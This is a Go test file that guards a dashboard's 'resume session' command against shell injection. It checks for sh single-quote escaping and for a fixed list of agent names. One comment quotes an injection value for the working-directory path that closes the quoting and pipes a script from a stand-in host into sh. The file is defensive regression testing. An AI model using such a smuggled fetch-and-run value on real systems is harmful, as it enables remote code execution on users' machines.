package web

import (
	"strings"
	"testing"
	"time"
)

// The resume command is a command line, not a string to display. It used to be
// assembled with double quotes:
//
//	'cd "' + cwd + '" && ' + agentCmd + ' --session "' + sessionPath + '"'
//
// A double-quoted argument ends at the first " inside it, so a working
// directory of
//
//	/x" ; curl evil.sh|sh ; "
//
// closed the cd argument and everything after it became a second command. The
// dashboard offers this string on a "Copy" button and documents it as the way
// to resume a session, which makes the dashboard itself the thing vouching for
// it. HTML escaping does nothing here — the two escapes are unrelated, and the
// value is not being rendered as markup here.
func TestJSResumeCommandIsQuotedForSh(t *testing.T) {
	script := readAsset(t, assets, "assets/dashboard.js")

	// The vulnerable construction, in any of the shapes it took.
	for _, old := range []string{
		`'cd "' + cwd + '"'`,
		`'cd "' + cwd + '" && `,
		`+" && claude --resume \""`,
		`+" && codex --resume \""`,
		`+" && agy --conversation \""`,
		`+ agentCmd + ' --session "'`,
	} {
		if strings.Contains(script, old) {
			t.Errorf("buildResumeCmd still builds a command with %q, "+
				"which a double quote in a log path terminates", old)
		}
	}

	// The replacement: single-quote each value, and escape the one character
	// that can end a single-quoted string.
	if !strings.Contains(script, "function shQuote(") {
		t.Fatal("buildResumeCmd has no sh quoting helper")
	}
	if !strings.Contains(script, `replace(/'/g, "'\\''")`) {
		t.Error("shQuote does not handle an embedded single quote, which is " +
			"the one character that ends the quoting it relies on")
	}
	if !strings.Contains(script, `"'" + String(value == null ? '' : value)`) {
		t.Error("shQuote does not wrap its value in single quotes")
	}
	// Every interpolated value has to go through it.
	for _, call := range []string{
		"shQuote(cwd)",
		"shQuote(sessionUid)",
		"shQuote(sessionPath)",
		"shQuote(agentCmd)",
	} {
		if !strings.Contains(script, call) {
			t.Errorf("buildResumeCmd does not quote %s", call)
		}
	}
}

// agentCmd is the one value buildResumeCmd takes that is not log-derived: it is
// the agent id, one of a fixed set the scanner assigns per source, so it is a
// constant rather than something an attacker chose. It is quoted anyway, because
// a command position is the wrong place to rely on that — but the claim is
// worth asserting, since it is why the resume command is a quoting problem and
// not a much larger one.
func TestAgentCommandInThePayloadIsTheStoredAgentNotALogField(t *testing.T) {
	srv, st := newTestServer(t)
	seed(t, st, time.Now())

	payload := dashboardPayload(t, get(t, srv, "/").Body.String())
	projects, ok := payload["projects"].([]any)
	if !ok || len(projects) == 0 {
		t.Fatal("no projects in the payload")
	}
	for _, p := range projects {
		pm := p.(map[string]any)
		cmd, _ := pm["agent_cmd"].(string)
		switch cmd {
		case "pi", "claude", "codex", "gemini", "agy", "opencode":
		default:
			t.Errorf("agent_cmd = %q, which is not one of the six known agents", cmd)
		}
	}
}
